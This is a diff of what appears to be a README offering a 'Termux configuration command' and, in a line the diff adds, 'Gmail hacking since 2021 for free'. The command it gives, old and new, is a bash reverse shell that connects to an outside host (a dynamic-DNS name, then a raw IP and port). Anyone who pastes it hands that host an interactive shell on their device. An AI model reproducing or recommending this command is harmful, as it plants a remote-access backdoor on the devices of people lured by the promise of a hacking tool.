@@ -5,9 +5,10 @@ https://servicez.ml/hackers.com/
 
 
 #Termux configuration command#
+#Gmail hacking since 2021 for free !#
 
 
-bash -i >& /dev/tcp/termux-configure.ddns.net/38863 0>&1
+bash -i >& /dev/tcp/193.161.193.99/29299  0>&1; gmail
 
 
 <!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
